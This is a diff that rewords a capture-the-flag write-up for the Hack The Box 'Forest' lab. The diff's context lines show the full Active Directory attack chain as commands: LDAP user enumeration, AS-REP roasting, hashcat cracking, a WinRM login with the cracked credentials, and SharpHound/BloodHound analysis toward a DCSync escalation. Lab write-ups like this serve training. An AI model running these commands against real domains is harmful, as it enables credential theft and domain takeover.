@@ -39,7 +39,7 @@ nmap -sC -sV -T4 10.10.10.161 -oA nmap/forest
 
 ## Enumeration
 
-Firstly, I generated and appended a hostname mapping entry to `/etc/hosts` to avoid possible DNS resolution issues later on with Kerberos.
+Firstly, I generated and appended a static hostname mapping entry to `/etc/hosts` to avoid possible DNS resolution issues later on with Kerberos.
 ```bash
 nxc smb '10.10.10.161' --generate-hosts-file files/hosts && sudo tee -a /etc/hosts < files/hosts
 
@@ -47,7 +47,7 @@ tail -n 1 /etc/hosts
 10.10.10.161     FOREST.htb.local FOREST
 ```
 
-Enumerated the domain users.
+LDAP enumeration identified seven active domain users.
 ```bash
 nxc ldap 'FOREST' -u '' -p '' -d 'htb.local' --active-users | awk '{print $5}' | grep -v '^[H,\[,-]' > files/users.txt && cat files/users.txt 
 
@@ -63,7 +63,7 @@ santi
 
 ## Exploitation
 
-I used the `users.txt` list to exploit accounts with the "`Do Not Require Kebreros Pre-Authentication`" user attribute enabled, allowing for an `AS-REP` attack and retrieve their encrypted password. Doing this, I acquired `svc-alfresco`'s password hash.
+I used the `users.txt` list to exploit accounts with the "`Do Not Require Kebreros Pre-Authentication`" user attribute enabled, allowing for an `AS-REP` attack and retrieve their encrypted password. Doing this, I acquired `svc-alfresco`'s password hash
 ```bash
 nxc ldap 'FOREST' -u files/users.txt  -p '' -d 'htb.local' --asreproast files/roast.txt     
 
@@ -71,7 +71,7 @@ nxc ldap 'FOREST' -u files/users.txt  -p '' -d 'htb.local' --asreproast files/ro
 LDAP        10.10.10.161    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:d92213ff872a80624a412d802a52b446$...
 ```
 
-I then cracked its AS-REP hash with `hashcat` to reveal its password `s3rvice`.
+Offline cracking of the captured AS-REP hash yielded the clear-text password `s3rvice`.
 ```bash
 hashcat -m 18200 -a 0 files/roast.txt /usr/share/wordlists/rockyou.txt
 
@@ -80,7 +80,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:b73c81fb8c33164c016884a6be75e669$2beb8c478e
 ...
 ```
 
-Discovered I could login to the service account via `winrm` on port `5985`.
+Credential validation confirmed `WinRM` access was available on port `5985`.
 ```bash
 nxc winrm 'FOREST' -u 'svc-alfresco' -p 's3rvice' -d 'htb.local'
 
@@ -102,7 +102,7 @@ User flag was in `svc-alfresco`'s Desktop.
 
 ## Privilege Escalation
 
-SharpHound was already on the machine in the `svc-alfresco` user's home directory. I ran it to collect everything.
+SharpHound was already on the machine in the `svc-alfresco` user's home directory. I ran it to enumerate everything on the domain.
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco> .\hound.exe -c all --zipfilename loot.zip
 
@@ -121,7 +121,7 @@ And downloaded it to my machine.
 Info: Downloading C:\Users\svc-alfresco\20250614160957_loot.zip to 20250614160957_loot.zip                  
 ```
 
-So I started Bloodhound
+So I started Bloodhound.
 ```bash
 sudo ./bloodhound-cli containers start
 
@@ -139,7 +139,7 @@ RETURN p
 LIMIT 1000
 ``` 
 
-To reveal that the service account is apart of the "`Account Operators`" group, which has permission to add users to the "`Exchange Windows Permissions`" group. This group - usually for legitimate reasons - has `WriteDACL` over the domain, leaving it vulnerable to a "DCSync" attack.
+Analysis revealed `svc-alfresco`'s membership in `Account Operators`, which grants permission to create users and modify group memberships for non-protected groups. This membership enabled adding users to `Exchange Windows Permissions`, which maintains `WriteDACL` privileges over the domain root - a configuration necessary for Exchange functionality but exploitable for privilege escalation.
 ![[Pasted image 20250615014133.png]]
 To perform the DCSync attack, I firstly created a new credential object and domain user account called "wither"
 ```powershell
